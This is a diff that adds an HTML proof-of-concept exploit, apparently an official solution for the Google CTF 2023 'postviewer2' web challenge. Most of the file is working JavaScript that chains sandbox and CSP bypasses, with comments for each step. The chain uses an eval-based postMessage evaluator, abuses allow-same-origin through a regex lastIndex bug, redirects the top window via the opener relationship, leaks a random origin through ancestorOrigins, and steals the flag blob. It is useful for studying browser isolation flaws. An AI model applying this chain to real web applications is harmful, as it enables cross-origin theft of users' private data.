@@ -1,0 +1,131 @@
+<!--
+ Copyright 2023 Google LLC
+
+ Licensed under the Apache License, Version 2.0 (the "License");
+ you may not use this file except in compliance with the License.
+ You may obtain a copy of the License at
+
+     http://www.apache.org/licenses/LICENSE-2.0
+
+ Unless required by applicable law or agreed to in writing, software
+ distributed under the License is distributed on an "AS IS" BASIS,
+ WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ See the License for the specific language governing permissions and
+ limitations under the License.
+-->
+
+<body>
+
+</body>
+<script>
+    (async () => {
+        function formsg(msg) {
+            return new Promise(resolve => {
+                onmessage = e => {
+                    if (e.data == msg) resolve();
+                }
+            });
+        }
+
+        const sleep = d => new Promise(r => setTimeout(r, d));
+
+        var ifr1 = document.createElement('iframe');
+        ifr1.src = 'https://sbx-random.postviewer2-web.2023.ctfcompetition.com/shim.html?o=' + encodeURIComponent(window.origin);
+        document.body.appendChild(ifr1);
+
+        /**     
+         * Step 1: 
+         * the very first bug is that we can load shim.html with allow-same-origin flag
+         * that is because, the regex has a global flag which increases lastIndex after first find.
+         * It set ups an evaluator on sbx-random suborigin
+         */
+
+        ifr1.onload = () => {
+            ifr1.contentWindow.postMessage({ body: `<script>onmessage=e=>eval(e.data);<\/script><iframe onload=top.postMessage('loaded','*')>`, mimeType: 'text/html', sandbox: ['allow-same-origin', 'allow-same-origin', 'allow-scripts', 'allow-top-navigation'] }, '*');
+        }
+
+        await formsg('loaded');
+        const deepIfr = ifr1.contentWindow[0][0]
+
+        /**
+         * Step 2:
+         * We prepare a deepIframe that will later used redirect top window to blob://sbx-random
+         */
+
+        deepIfr.location = URL.createObjectURL(new Blob([`<iframe name="deepIframe" onload=top.postMessage('loaded','*')>`], { type: 'text/html' }));
+        const shimIfr = ifr1.contentWindow[0];
+        await formsg('loaded');
+        
+        /**
+         * Step 3:
+         * The main app can be only iframed by *.postviewer2-web origins. However, shim domains have frame-src blob:
+         * so it's not possible to directly iframe the main app. Instead, we use find a subpage on sbx-random origin
+         * that doesn't set frame-src. One possibility is to just load a long URL that will be blocked on balancer side
+         */
+
+        const longUrl = `https://sbx-random.postviewer2-web.2023.ctfcompetition.com/${'a'.repeat(200000)}`
+
+        /**
+         * Step 4:
+         * Normally, iframes are not able to redirect a top window to prevent frame busting (https://chromestatus.com/feature/5851021045661696).
+         * However, openee can redirect its opener so we call open(url, "deepIframe") to establish that connection.
+         * As a parent, you can open context to all children and grand children.
+         */ 
+
+        open(longUrl, 'deepIframe');
+        
+        
+        await formsg('loaded');
+        await sleep(1000);
+        
+        /**
+         * Step 5: 
+         * Use the evaluator to create a Blob from csp-less sbx-random origin
+         * and redirect top window to it.
+         */
+
+        shimIfr.postMessage(`top[0][0][0][0].eval(\`top.location = URL.createObjectURL(new Blob(['<script>eval(atob("${btoa("(" + POC + ")()")}"))<\/script>'], {type: 'text/html'}))\`)`, '*');
+
+        /** Steps 6, 10 execute the following:
+         *  6. Iframe main page and select flag
+         *  7. Leak flag's frame random's origin (e.g. sbx-dasjkdbkjsda) via ancestorOrigins property
+         *  8. Once leaked, spawn an iframe pointing to sbx-dasjkdbkjsda
+         *  9. From the forged iframe, read the blob URL of the flag contents
+         *  10. Fetch the blob with flag and display it.
+         */ 
+
+        function POC() {
+            const sleep = d => new Promise(r => setTimeout(r, d));
+            /* Step 6 */
+            onload = async () => {
+                var x = document.createElement('iframe');
+                x.src = 'https://postviewer2-web.2023.ctfcompetition.com/#file-87ebbc317d687eeff47403603cc6dfb9b7d6c817'
+                document.body.appendChild(x);
+                await sleep(1000);
+                /* Step 7 */
+                top[0][0][0].location = URL.createObjectURL(new Blob(['<script>top.postMessage(location.ancestorOrigins[0],"*")<\/script>'], { type: 'text/html' }));
+            }
+
+            onmessage = e => {
+                /* Step 8 */
+                if (e.data.includes?.('sbx-')) {
+                    var x = document.createElement('iframe');
+                    x.src = e.data + '/shim.html?o=' + encodeURIComponent(window.origin);
+                    document.body.appendChild(x);
+
+                    /* Steps 9 & 10 */
+                    x.onload = () => {
+                        x.contentWindow.postMessage({ body: `<script>fetch(top[0][0].document.querySelector('iframe').src).then(e=>e.text()).then(e=>top.postMessage({flag: e},'*'))<\/script>`, mimeType: 'text/html', sandbox: ['allow-same-origin', 'allow-same-origin', 'allow-scripts', 'allow-modals'] }, '*');
+                    }
+                }
+
+                if (e.data.flag) {
+                    history.pushState('','',`blob:${location.origin}/${e.data.flag}`);
+                }
+            }
+        }
+
+    })()
+
+
+</script>
